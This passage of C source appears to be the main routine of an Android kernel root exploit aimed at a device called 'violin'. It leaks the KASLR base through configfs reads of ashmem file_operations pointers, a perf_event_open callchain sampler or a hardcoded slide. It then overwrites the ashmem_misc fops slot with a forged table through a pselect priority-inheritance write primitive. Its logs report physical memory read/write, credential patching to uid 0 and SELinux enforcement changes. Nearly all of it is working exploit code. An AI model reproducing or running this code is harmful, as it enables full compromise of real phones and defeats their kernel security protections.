  crash_debug_log(0,
                  "CFGPROBE1: slot=0x%llx rd=%zd errno=%d leaked_fops=0x%llx\n",
                  (unsigned long long)misc_fops_slot, rd_misc, err_misc,
                  (unsigned long long)leaked_fops);

  uint64_t probe_value = 0;
  cfgprobe_debug_read64(fd, "ashmem_fops_direct", data_addr(ASHMEM_FOPS),
                        &probe_value);
  cfgprobe_debug_read64(fd, "anon_pipe_buf_ops_direct",
                        data_addr(ANON_PIPE_BUF_OPS), &probe_value);
  /* SLIDE_SYSCTL_BOOTID is already a P0/direct-map alias.  Passing it to
   * data_addr() treats that alias as an image address and produces an
   * invalid ffffffbf... address; use it directly for this diagnostic probe. */
  cfgprobe_debug_read64(fd, "sysctl_bootid_direct",
                        SLIDE_SYSCTL_BOOTID, &probe_value);

  if (rd_misc != (ssize_t)sizeof(leaked_fops) || !is_kernel_ptr(leaked_fops)) {
    close(fd);
    return 0;
  }

  uint64_t open_ptr = 0;
  uint64_t ioctl_ptr = 0;
  uint64_t mmap_ptr = 0;
  uint64_t release_ptr = 0;
  uint64_t show_fdinfo_ptr = 0;
  ssize_t rd_open =
      configfs_read_once(fd, leaked_fops + FOPS_OPEN_OFF, &open_ptr, sizeof(open_ptr));
  ssize_t rd_ioctl =
      configfs_read_once(fd, leaked_fops + FOPS_IOCTL_OFF, &ioctl_ptr, sizeof(ioctl_ptr));
  ssize_t rd_mmap =
      configfs_read_once(fd, leaked_fops + FOPS_MMAP_OFF, &mmap_ptr, sizeof(mmap_ptr));
  ssize_t rd_release = configfs_read_once(
      fd, leaked_fops + FOPS_RELEASE_OFF, &release_ptr, sizeof(release_ptr));
  ssize_t rd_show = configfs_read_once(fd, leaked_fops + FOPS_SHOW_FDINFO_OFF,
                                       &show_fdinfo_ptr, sizeof(show_fdinfo_ptr));
  crash_debug_log(0,
                  "CFGPROBE2: open=%zd 0x%llx ioctl=%zd 0x%llx mmap=%zd 0x%llx release=%zd 0x%llx show=%zd 0x%llx\n",
                  rd_open, (unsigned long long)open_ptr, rd_ioctl,
                  (unsigned long long)ioctl_ptr, rd_mmap,
                  (unsigned long long)mmap_ptr, rd_release,
                  (unsigned long long)release_ptr, rd_show,
                  (unsigned long long)show_fdinfo_ptr);
  if (rd_open != (ssize_t)sizeof(open_ptr) ||
      rd_ioctl != (ssize_t)sizeof(ioctl_ptr) ||
      rd_mmap != (ssize_t)sizeof(mmap_ptr) ||
      rd_release != (ssize_t)sizeof(release_ptr) ||
      rd_show != (ssize_t)sizeof(show_fdinfo_ptr) || !is_kernel_ptr(open_ptr) ||
      !is_kernel_ptr(ioctl_ptr) || !is_kernel_ptr(mmap_ptr) ||
      !is_kernel_ptr(release_ptr) || !is_kernel_ptr(show_fdinfo_ptr)) {
    close(fd);
    return 0;
  }

  uint64_t base_from_fops = leaked_fops - (ASHMEM_FOPS - KIMAGE_TEXT_BASE);
  uint64_t base_from_open = open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  uint64_t expected_ioctl = base_from_open + (ASHMEM_IOCTL - KIMAGE_TEXT_BASE);
  uint64_t expected_mmap = base_from_open + (ASHMEM_MMAP - KIMAGE_TEXT_BASE);
  uint64_t expected_release = base_from_open + (ASHMEM_RELEASE - KIMAGE_TEXT_BASE);
  uint64_t expected_show =
      base_from_open + (ASHMEM_SHOW_FDINFO - KIMAGE_TEXT_BASE);
  crash_debug_log(0,
                  "CFGPROBE3: base_fops=0x%llx base_open=0x%llx exp_ioctl=0x%llx exp_mmap=0x%llx exp_release=0x%llx exp_show=0x%llx\n",
                  (unsigned long long)base_from_fops,
                  (unsigned long long)base_from_open,
                  (unsigned long long)expected_ioctl,
                  (unsigned long long)expected_mmap,
                  (unsigned long long)expected_release,
                  (unsigned long long)expected_show);
  close(fd);

  if (base_from_fops != base_from_open || ioctl_ptr != expected_ioctl ||
      mmap_ptr != expected_mmap || release_ptr != expected_release ||
      show_fdinfo_ptr != expected_show) {
    return 0;
  }

  kaslr_base = base_from_open;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_step = 0;
  crash_debug_log(0, "CFGPROBE_OK: kaslr_base=0x%llx slide=0x%llx\n",
                  (unsigned long long)kaslr_base,
                  (unsigned long long)kaslr_slide);
  return 1;
}

#if PERF_LEAK_ONLY
/*
 * perf_leak: use perf_event_open to sample kernel callchain and leak KASLR.
 * Adapted from CVE43499.zip perf_leak.c for violin.
 * Requires perf_event_paranoid=-1 and SELinux allowing perf_event_open.
 */
#include <sys/mman.h>
#include <linux/perf_event.h>

struct perf_leak_sample {
  struct perf_event_header h;
  uint64_t ip, pid_tid, time, addr, period;
  uint64_t cc[32];
};

static int run_perf_leak(void) {
  crash_debug_log(1, "PERF_LEAK: start pid=%d\n", getpid());

  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_HARDWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_HW_CPU_CYCLES;
  a.sample_period = 100000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN | PERF_SAMPLE_TID;
  a.sample_max_stack = 24;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_kernel = 0;
  a.exclude_hv = 1;

  int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) {
    int e = errno;
    crash_debug_log(0, "PERF_LEAK_FAIL: perf_event_open errno=%d(%s)\n",
                    e, strerror(e));
    fprintf(stderr, "perf_event_open failed: errno=%d (%s)\n", e, strerror(e));
    return 1;
  }
  crash_debug_log(0, "PERF_LEAK_OK: fd=%d\n", fd);
  fprintf(stderr, "perf_event_open OK fd=%d\n", fd);

  int pg = sysconf(_SC_PAGESIZE);
  size_t sz = (size_t)pg * 33;
  void *buf = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    crash_debug_log(0, "PERF_LEAK_FAIL: mmap errno=%d\n", errno);
    close(fd);
    return 1;
  }

  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

  for (int i = 0; i < 5000000; i++) {
    getpid();
    getuid();
  }

  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  uint64_t tail = 0;
  char *data = (char *)buf + hdr->data_offset;
  uint64_t data_size = hdr->data_size;

  uint64_t min_addr = ~0ULL;
  int total = 0, vmlinux = 0;
  while (tail < head) {
    struct perf_leak_sample *s = (struct perf_leak_sample *)(data + (tail % data_size));
    if (s->h.size == 0) break;
    tail += s->h.size;
    uint64_t all[33];
    int ac = 1;
    all[0] = s->ip;
    for (int c = 0; c < 24 && s->cc[c]; c++) {
      all[ac++] = s->cc[c];
    }
    for (int i = 0; i < ac; i++) {
      uint64_t v = all[i];
      if (v < 0xffff000000000000ULL) continue;
      total++;
      /* vmlinux: 0xffffffc0xxxxxxxx (violin KIMAGE_TEXT_BASE range) */
      if ((v >> 40) == 0xffffffc) {
        vmlinux++;
        if (v < min_addr) min_addr = v;
        if (vmlinux <= 16) {
          crash_debug_log(0, "PERF_LEAK_ADDR: 0x%016llx\n",
                          (unsigned long long)v);
          fprintf(stderr, "VMLINUX: 0x%016llx\n", (unsigned long long)v);
        }
      }
    }
  }

  crash_debug_log(0, "PERF_LEAK_SCAN: total=%d vmlinux=%d\n", total, vmlinux);
  fprintf(stderr, "\ntotal kernel addrs: %d, vmlinux: %d\n", total, vmlinux);

  if (vmlinux > 0) {
    unsigned long long base = KIMAGE_TEXT_BASE;
    long long slide = (long long)min_addr - (long long)base;
    crash_debug_log(0, "PERF_LEAK_RESULT: min=0x%016llx base=0x%016llx "
                    "slide=0x%llx (%lld MB)\n",
                    (unsigned long long)min_addr, base,
                    (unsigned long long)slide, slide / (1024 * 1024));
    fprintf(stderr, "min vmlinux addr: 0x%016llx\n", (unsigned long long)min_addr);
    fprintf(stderr, "KIMAGE_TEXT_BASE: 0x%016llx\n", base);
    fprintf(stderr, "est slide: 0x%llx (%lld MB)\n",
            (unsigned long long)slide, slide / (1024 * 1024));
    fprintf(stderr, "RUNTIME KIMAGE_TEXT_BASE: 0x%016llx\n",
            min_addr & ~0x3FFFFFULL);
    fprintf(stderr, "CFI_KASLR_BASE=0x%016llx\n", (unsigned long long)min_addr);
    crash_debug_log(0, "PERF_LEAK_KASLR: CFI_KASLR_BASE=0x%016llx\n",
                    (unsigned long long)min_addr);
  } else {
    crash_debug_log(0, "PERF_LEAK_NOVMLINUX: no kernel text addresses found\n");
    fprintf(stderr, "No kernel text addresses found in perf samples\n");
  }

  munmap(buf, sz);
  close(fd);
  return 0;
}
#endif /* PERF_LEAK_ONLY */

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

#if PERF_LEAK_ONLY
  crash_debug_log(1, "PERF_LEAK_ONLY: start\n");
  int r = run_perf_leak();
  crash_debug_log(0, "PERF_LEAK_ONLY: done ret=%d\n", r);
  return r;
#endif

  crash_debug_log(1, "STEP0: preload loaded pid=%d\n", getpid());

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

#if CFI_TRANSPORT_ONLY_DIAG
  return run_cfi_transport_only_diag();
#endif

#if DIRECT_WRITE_ONLY_DIAG
  return run_direct_write_diag();
#endif

#if DIRECT_WRITE_BOOTID_PROBE
  return run_direct_write_bootid_probe();
#endif

#if DIRECT_WRITE_ROUTE_ONLY_PROBE
  return run_direct_write_route_only_probe();
#endif

#if PSELECT_ONLY_PROBE
  return run_pselect_only_probe();
#endif

#if PSELECT_LAYOUT_ONLY_PROBE
  return run_pselect_layout_only_probe();
#endif

#if KERNEL_PAGE_RECLAIM_PROBE
  return run_kernel_page_reclaim_probe();
#endif

#if NORMAL_PI_SCHED_PROBE
  return run_normal_pi_sched_probe();
#endif

  crash_debug_log(0, "CFGPROBE_START\n");
  int cfgprobe_ok = try_direct_configfs_kaslr_probe();
  if (cfgprobe_ok) {
    crash_debug_log(0, "STEP1A: direct configfs kaslr OK base=0x%llx slide=0x%llx\n",
                    (unsigned long long)kaslr_base,
                    (unsigned long long)kaslr_slide);
  } else {
    crash_debug_log(0, "CFGPROBE_MISS\n");
  }

  crash_debug_log(0, "CFGPROBE_STOP_AFTER_PROBE: ok=%d kaslr_done=%d\n",
                  cfgprobe_ok, kaslr_done);

#if CFGPROBE_ONLY_DIAG
  crash_debug_log(0, "CFGPROBE_ONLY_DIAG_STOP\n");
  return cfgprobe_ok ? 0 : 1;
#endif

  if (!kaslr_done) {
    apply_external_kaslr_override();
  }

  if (!kaslr_done && CFI_STAGE_ONLY) {
    crash_debug_log(0,
                    "CFI_STAGE_ONLY_STOP_NO_KASLR: no same-boot canonical base; "
                    "not entering scheduler slide or stale fallback\n");
    return 2;
  }

  if (!kaslr_done) {
    pin_to_core(CORE);
    int slide_ok = slide_leak_kernel_base();
    if (!slide_ok) {
      pr_error("slide kaslr leak failed\n");

#if ALLOW_STALE_HARDCODED_KASLR
      /* HARDCODED KASLR SLIDE FALLBACK — for testing pipe physrw + cred patch.
       * From rooted violin kallsyms (kptr_restrict=0):
       *   _text = 0xffffffe387200000, KIMAGE_TEXT_BASE = 0xffffffc008000000
       *   slide = 0x000000237f200000
       * ONLY works on same boot. Reboot invalidates it. */
      kaslr_base = 0xffffffe387200000ULL;
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      kaslr_done = 1;
      crash_debug_log(0, "STEP1_HARDCODED: kaslr_base=0x%llx slide=0x%llx\n",
                      (unsigned long long)kaslr_base,
                      (unsigned long long)kaslr_slide);
#else
      crash_debug_log(0,
                      "STEP1_NO_KASLR_STOP: scheduler slide failed; stale "
                      "hardcoded fallback disabled\n");
      return 2;
#endif
    }
  }
#if SLIDE_ONLY_DIAG
  crash_debug_log(0,
                  "SLIDE_ONLY_DIAG_STOP: kaslr_done=%d base=0x%llx slide=0x%llx\n",
                  kaslr_done, (unsigned long long)kaslr_base,
                  (unsigned long long)kaslr_slide);
  return kaslr_done ? 0 : 1;
#endif
  crash_debug_log(0, "STEP1: slide OK kaslr_base=0x%llx slide=0x%llx\n",
                  (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide);
  fflush(stdout);

  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  crash_debug_log(0, "STEP2: prepare_page page=0x%llx lock=0x%llx fops=0x%llx\n",
                  (unsigned long long)page_base, (unsigned long long)fake_lock, (unsigned long long)fake_fops);
  fflush(stdout);

  /* Direct write 路径: 设置 pselect 写入目标 = ashmem_misc.fops 插槽,
   * 值 = fake_fops (内核页上的伪造 file_operations 表)。
   * pselect fd_set words 覆写 waiter 结构字段, PI chain walk 时
   * 内核将 fake_fops 地址写入 ashmem_misc+0x10, 完成 fops 劫持。 */
  set_pselect_write(data_addr(ASHMEM_MISC) + 0x10, fake_fops, 1);
  crash_debug_log(0, "STEP2B: set_pselect_write target=0x%llx value=0x%llx\n",
                  (unsigned long long)(data_addr(ASHMEM_MISC) + 0x10),
                  (unsigned long long)fake_fops);

  crash_debug_log(0, "STEP3: entering run_main_route_threads\n");
  fflush(stdout);

  run_main_route_threads();

  crash_debug_log(0, "STEP4: run_main_route_threads returned\n");

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  sleep(5);
  return 0;
}



